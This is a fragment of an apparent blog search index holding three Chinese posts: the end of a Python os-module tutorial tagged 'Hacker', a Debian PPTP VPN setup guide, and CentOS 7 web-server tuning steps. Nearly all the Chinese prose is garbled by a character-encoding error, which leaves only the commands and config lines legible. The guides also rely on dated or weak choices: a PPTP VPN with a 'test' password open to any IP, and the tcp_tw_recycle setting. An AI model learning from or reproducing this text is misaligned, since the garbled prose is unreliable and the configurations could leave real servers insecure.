'__builtins__', '__doc__', '__file__', '__name__', '__package__', '_copy_reg', '_execvpe', '_exists', '_exit', '_get_exports_list', '_make_stat_result', '_make_statvfs_result', '_pickle_stat_result', '_pickle_statvfs_result', '_spawnvef', 'abort', 'access', 'altsep', 'chdir', 'chmod', 'chown', 'chroot', 'close', 'closerange', 'confstr', 'confstr_names', 'ctermid', 'curdir', 'defpath', 'devnull', 'dup', 'dup2', 'environ', 'errno', 'error', 'execl', 'execle', 'execlp', 'execlpe', 'execv', 'execve', 'execvp', 'execvpe', 'extsep', 'fchdir', 'fchmod', 'fchown', 'fdatasync', 'fdopen', 'fork', 'forkpty', 'fpathconf', 'fstat', 'fstatvfs', 'fsync', 'ftruncate', 'getcwd', 'getcwdu', 'getegid', 'getenv', 'geteuid', 'getgid', 'getgroups', 'getloadavg', 'getlogin', 'getpgid', 'getpgrp', 'getpid', 'getppid', 'getresgid', 'getresuid', 'getsid', 'getuid', 'initgroups', 'isatty', 'kill', 'killpg', 'lchown', 'linesep', 'link', 'listdir', 'lseek', 'lstat', 'major', 'makedev', 'makedirs', 'minor', 'mkdir', 'mkfifo', 'mknod', 'name', 'nice', 'open', 'openpty', 'pardir', 'path', 'pathconf', 'pathconf_names', 'pathsep', 'pipe', 'popen', 'popen2', 'popen3', 'popen4', 'putenv', 'read', 'readlink', 'remove', 'removedirs', 'rename', 'renames', 'rmdir', 'sep', 'setegid', 'seteuid', 'setgid', 'setgroups', 'setpgid', 'setpgrp', 'setregid', 'setresgid', 'setresuid', 'setreuid', 'setsid', 'setuid', 'spawnl', 'spawnle', 'spawnlp', 'spawnlpe', 'spawnv', 'spawnve', 'spawnvp', 'spawnvpe', 'stat', 'stat_float_times', 'stat_result', 'statvfs', 'statvfs_result', 'strerror', 'symlink', 'sys', 'sysconf', 'sysconf_names', 'system', 'tcgetpgrp', 'tcsetpgrp', 'tempnam', 'times', 'tmpfile', 'tmpnam', 'ttyname', 'umask', 'uname', 'unlink', 'unsetenv', 'urandom', 'utime', 'wait', 'wait3', 'wait4', 'waitpid', 'walk', 'write']&gt;&gt;&gt; ‰Ω†ÂèØ‰ª•ÁúãÂà∞‰∏äÈù¢osÊ®°ÂùóÁªô‰Ω†Êèê‰æõ‰∫ÜÂæàÂ§öÂèØ‰ª•‰ΩøÁî®ÁöÑÂäüËÉΩÂáΩÊï∞ÔºåÂÖ∂‰∏≠ÊàëÂèëÁé∞ÊàëÁªèÂ∏∏‰ΩøÁî®‚Äùos.system‚ÄùÔºåÊàëÂèØÁªôÂÆÉ‰º†ÈÄí‰∏Ä‰∏™ÂëΩ‰ª§ÔºåÁÑ∂ÂêéÈÄöËøáÂÆÉÂéªÂú®Á≥ªÁªüÂ∫ïÂ±ÇÊâßË°åÊàë‰ª¨‰º†ÈÄíÁöÑÂëΩ‰ª§.‰∏ãÈù¢Êàë‰ª¨Â∞Ü‰ºöÊâßË°å‰∏Ä‰∏™ÂëΩ‰ª§‚Äùecho ‚ÄòUHJpbWFsIFNlY3VyaXR5Cg==‚Äô | base64 -d‚Äù: 1234&gt;&gt;&gt;&gt;&gt;&gt; os.system("echo 'UHJpbWFsIFNlY3VyaXR5Cg==' | base64 -d")Primal Security&gt;&gt;&gt; ÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂ÂØπË±°Áé∞Âú®Êàë‰ª¨Â∞ÜÊºîÁ§∫‰∏Ä‰∫õ‰æãÂ≠ê,Â¶Ç‰ΩïÂú®PythonÈáåÈù¢‰ªé‰∏Ä‰∏™Êñá‰ª∂ÈáåÈù¢ËØªÂèñÊï∞ÊçÆÂíåÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂„ÄÇ‰∏ãÈù¢ÁöÑËøô‰∏™‰æãÂ≠êÊºîÁ§∫‰∫ÜÂ¶Ç‰ΩïÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂ÂØπË±°ÔºåÂπ∂‰∏îËØªÂèñ/ÂÜôÂÖ•Êï∞ÊçÆÂà∞Ëøô‰∏™ÂØπË±°ÈáåÈù¢ÔºåÈÄöÂ∏∏‰Ω†Ëá™Â∑±ËØªÂèñ‰∏Ä‰∏™Êñá‰ª∂ÁöÑÊï∞ÊçÆÔºåÂπ∂‰∏îÂÅö‰∏Ä‰∫õÈÄªËæëÂ§ÑÁêÜÁÑ∂ÂêéÊääËæìÂá∫ÁöÑÂÜôÂà∞Êñá‰ª∂ÈáåÈù¢: 12345678&gt;&gt;&gt;&gt;&gt;&gt; file = open('test.txt', 'w')&gt;&gt;&gt; file.write('Hello World')&gt;&gt;&gt; file.close() &gt;&gt;&gt; file = open('test.txt', 'r')&gt;&gt;&gt; file.readlines()['Hello World']&gt;&gt;&gt; Âú®PythonËß£ÈáäÂô®ÈáåÈù¢ÁªÉ‰π†‰∏äÈù¢ÁöÑÂÜÖÂÆπÂπ∂‰∏îÂ§öÂä†Â∑©Âõ∫ÔºåÂõ†‰∏∫Ëøô‰∫õÂÜÖÂÆπÂú®ÂêéÈù¢ÁöÑÁ´†ËäÇÈáåÈù¢‰ºöÁªèÂ∏∏‰ΩøÁî®ÔºåÂΩìÊàëÂÜô‰ª£Á†ÅÁöÑÊó∂ÂÄôÔºåÊàëÂñúÊ¨¢ÊâìÂºÄ‰∏§‰∏™ÁªàÁ´ØÔºå‰∏Ä‰∏™Áî®‰∫éÊâßË°åpythonËß£ÈáäÂô®ÔºåËøòÊúâ‰∏Ä‰∏™Áî®Êù•ÊääÈÄªËæëÂÜôÂÖ•Âà∞ËÑöÊú¨ÈáåÈù¢„ÄÇ‰∏ã‰∏ÄÁ´†Â∞Ü‰ºöÂÜô‰∏Ä‰∏™ÁúüÂÆûÁöÑPythonËÑöÊú¨Ôºå Â£∞ÊòéÂÆö‰πâÔºåÁ±ªÂíåsysÊ®°Âùó„ÄÇ]]></content>
      <categories>
        <category>Python</category>
        <category>Hacker</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[LinuxÊê≠Âª∫vpnÊúçÂä°Âô®]]></title>
    <url>%2F2015%2F07%2F02%2Flinux-vpn%2F</url>
    <content type="text"><![CDATA[ÊºîÁ§∫‰∏≠‰ΩøÁî®ÁöÑÊòØDebainÁ≥ªÁªü,‰ΩÜÊÄùË∑ØÁõ∏Âêå,Â•ΩÁöÑÊàë‰ª¨ÂºÄÂßãÂêß 1„ÄÅÂÆâË£ÖPPTPD1apt-get install pptpd 2„ÄÅÁºñËæëpptpd.conf1vim /etc/pptpd.conf ‰ΩøÈùûÊ≥®ÈáäÁöÑÂÜÖÂÆπÂ¶Ç‰∏ã 123option /etc/ppp/pptpd-optionslocalip 192.168.0.1remoteip 192.168.0.234-238,192.168.0.245 Ëøô‰∏§Âè•ËÆæÁΩÆ‰∫ÜÂΩìÂ§ñÈÉ®ËÆ°ÁÆóÊú∫ÈÄöËøápptpËÅîÊé•Âà∞vpnÂêéÊâÄËÉΩÊãøÂà∞ÁöÑipÂú∞ÂùÄËåÉÂõ¥ÂíåÊúçÂä°Âô®ÁöÑipÂú∞ÂùÄËÆæÁΩÆ 3„ÄÅÊ∑ªÂä†ÁôªÂΩïÁî®Êà∑1vim /etc/ppp/chap-secrets Ê∑ªÂä†‰∏ÄË°åÔºåÂÜÖÂÆπÂ¶Ç‰∏ã 123#client server secret IP addresses#Áî®Êà∑Âêç pptpd ÂØÜÁ†Å ÂÖÅËÆ∏ËøûÊé•IPtest pptpd "test" * ÂØÜÁ†ÅÁî®ÂºïÂè∑Êã¨Ëµ∑Êù•ÔºåÊúÄÂêéÈÇ£‰∏™ÊòüÂè∑ÊòØËØ¥ÂÖÅËÆ∏‰ªé‰ªª‰ΩïIPÂú∞ÂùÄËøûÊé•ÔºåÂ¶ÇÊûú‰Ω†ÊÉ≥ÂçïÁã¨ËÆæÂÆöIPÂú∞ÂùÄ‰πüÂèØ‰ª• ÁêÜËÆ∫‰∏äÂà∞ËøôÈáå‰∏Ä‰∏™vpnÂ∞±Â∑≤ÁªèÊê≠Âª∫ÂÆåÊØï‰∫Ü„ÄÇ‰∏çËøá‰Ω†Âπ∂‰∏çËÉΩÈÄöËøáËøô‰∏™Êù•‰∏äInternetÔºåÂõ†‰∏∫ÊâÄÊúâÁöÑÊï∞ÊçÆÈÉΩ‰ΩúÁî®‰∫éÈÇ£Âè∞pptpdÁöÑÊúçÂä°Âô®‰∏äÔºå ËÄå‰∏ç‰ºö‰º†ÂÖ•Êã®ÂÖ•ÁöÑËÆ°ÁÆóÊú∫ËÆæÂ§á‰∏ä„ÄÇË¶Å‰∏äInternetËøòÈúÄË¶ÅÈÖçÁΩÆiptablesÔºö 4„ÄÅ ËÆæÁΩÆDNSËß£ÊûêÔºåÁºñËæëpptpd-options1vim /etc/ppp/pptpd-options ÂêçÁß∞ÂèØËÉΩ‰ºö‰∏çÂêåÔºåÂÖ∑‰Ωì‰ΩçÁΩÆÂú®/etc/pptpd.conf18Ë°åÂ∑¶Âè≥ ÊâæÂà∞ms-dnsÔºåÂèñÊ∂àÊéâÊ≥®ÈáäÔºåÂπ∂‰øÆÊîπDNSÂú∞ÂùÄÊàëÁî®ÁöÑÊòØgoogle dnsÔºåÂ¶Ç‰∏ã : 12ms-dns 8.8.8.8ms-dns 8.8.4.4 5„ÄÅ ÂºÄÂêØËΩ¨Âèë1vim /etc/sysctl.conf ÂèñÊ∂àÂ¶Ç‰∏ãÂÜÖÂÆπË°åÁöÑÊ≥®Èáä 1net.ipv4.ip_forward=1 6„ÄÅÊâìÂºÄIPËΩ¨ÂèëÂäüËÉΩ1echo 1 &gt; /proc/sys/net/ipv4/ip_forward 7„ÄÅËÆæÁΩÆiptables1iptables -t nat -I POSTROUTING -j MASQUERADE 8„ÄÅ ÂêØÂä®ÊúçÂä°1/etc/init.d/pptpd restart VPNÊê≠Âª∫ÂÆåÊØïÔºåÂèØ‰ª•Â∞ùËØïÁî®ÂÆ¢Êà∑Á´ØÁôªÂΩï‰∫Ü„ÄÇpptpdÁõëÂê¨Á´ØÂè£Âè∑‰∏∫1723]]></content>
      <categories>
        <category>VPN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Centos7‰Ωú‰∏∫webÊúçÂä°Âô®‰ºòÂåñ]]></title>
    <url>%2F2015%2F04%2F04%2Flinux-web%2F</url>
    <content type="text"><![CDATA[Centos7‰Ωú‰∏∫webÊúçÂä°Âô®ÁöÑ‰∏Ä‰∫õÁÆÄÂçïÈÖçÁΩÆ 1. ÂÖ≥Èó≠firewalldÂπ∂ÊõøÊç¢iptables1234systemctl stop firewalld.service #ÂÅúÊ≠¢firewallsystemctl disable firewalld.service #Á¶ÅÊ≠¢firewallÂºÄÊú∫ÂêØÂä®yum install iptables-services #ÂÆâË£Öiptables -nvL #Êü•ÁúãËßÑÂàô 2. Âä†Â§ßÊâìÂºÄÊñá‰ª∂Êï∞ÈôêÂà∂123456789vim /etc/security/limits.conf#Ê∑ªÂä†Â¶Ç‰∏ãÂÜÖÂÆπ:* soft nofile 1024000* hard nofile 1024000hive - nofile 1024000hive - nproc 1024000 ulimit -nulimit -a Êü•ËØ¢ÂΩìÂâçÈÖçÁΩÆ 3. Êõ¥ÊîπÁî®Êà∑ËøõÁ®ãÈôêÂà∂123456vim /etc/security/limits.d/20-nproc.conf#Êõ¥Êîπ‰∏Ä‰∏ãÂÜÖÂÆπ* soft nproc 40960root soft nproc unlimited #Êó†ÈôêÂà∂ Ê≠§Ê≠•È™§ÈúÄË¶ÅÈáçÂêØÊú∫Âô®ÁîüÊïàÔºåÂèØ‰ª•ËÆæÁΩÆÂÆåÂêéÂÜçÈáçÂêØ 4. ÁΩëÁªúÁ∫øÁ®ã‰ºòÂåñvim /etc/sysctl.conf 1234567891011121314151617181920212223242526#Âä†ÂÖ•Â¶Ç‰∏ãÂÜÖÂÆπ# Disable IPv6net.ipv6.conf.all.disable_ipv6 = 1net.ipv6.conf.default.disable_ipv6 = 1# Determines how often to check for stale neighbor entries.net.ipv4.neigh.default.gc_stale_time=120# Using arp_announce/arp_ignore to solve the ARP Problemnet.ipv4.conf.default.arp_announce = 2net.ipv4.conf.all.arp_announce=2vm.swappiness = 0net.ipv4.tcp_max_tw_buckets = 5000net.ipv4.tcp_max_syn_backlog = 1024net.ipv4.tcp_synack_retries = 2net.ipv4.conf.lo.arp_announce=2net.ipv4.tcp_keepalive_time = 1800net.ipv4.tcp_keepalive_probes = 3net.ipv4.tcp_keepalive_intvl = 15net.ipv4.tcp_syncookies = 1net.ipv4.tcp_tw_reuse = 1net.ipv4.tcp_tw_recycle = 1net.ipv4.tcp_fin_timeout = 30 ÊâßË°å/sbin/sysctl -p‰ΩøËÆæÁΩÆÁîüÊïà 5. Êó∂Èó¥Ê†°ÂØπ123456789cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtimentpdate us.pool.ntp.orgcrontab -e0-59/10 * * * * /usr/sbin/ntpdate us.pool.ntp.org | logger -t NTPservice crond restart 6. ÂÖ≥Èó≠rootÁôªÂΩïÂπ∂‰øÆÊîπsshÁ´ØÂè£1. Ê∑ªÂä†ÊôÆÈÄöÁî®Êà∑123groupadd poweruseradd -d /home/www/ -g power testpasswd test 2. iptablesÂºÄÂêØ5233Á´ØÂè£ 5233‰∏∫‰∏ãÈù¢ÁöÑÊõ¥ÊîπÂêésshÁ´ØÂè£, Ê≠§Ê≠•È™§È°ªÂÖà‰∫é‰∏ãÈù¢Ê≠•È™§ÔºåÂê¶Âàô‰ºöÈÄ†ÊàêsshËøû‰∏ç‰∏äÁöÑ vi /etc/sysconfig/iptables Ê∑ªÂä† 1-A INPUT -p tcp -m state --state NEW -m tcp --dport 5233 -j ACCEPT ÊâßË°å/sbin/iptables restart 3. ‰øÆÊîπsshdÈÖçÁΩÆÊñá‰ª∂vim /etc/ssh/sshd_config Á¶ÅÊ≠¢rootÁôªÈôÜÊääPermitRootLogin yesÊîπ‰∏∫PermitRootLogin no ‰øÆÊîπÈªòËÆ§Á´ØÂè£Âè∑ÊääPort 22Êîπ‰∏∫Port 5233ÊúÄÂêéÊâßË°åsystemctl restart sshd.service 7. Á¶ÅÊ≠¢ping12345678Á¶ÅÊ≠¢echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_allÂºÄÂêØecho 0 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all#Ê∞∏‰πÖ‰øùÂ≠òvi /etc/rc.d/rc.localecho 1 &gt;/proc/sys/net/ipv4/icmp_echo_ignore_all 8. ÁΩëÁªúÂëΩ‰ª§ifconfig,netstatyum -y install net-tools]]></content>
      <categories>
        <category>WEB</category>
      </categories>
  </entry>
</search>
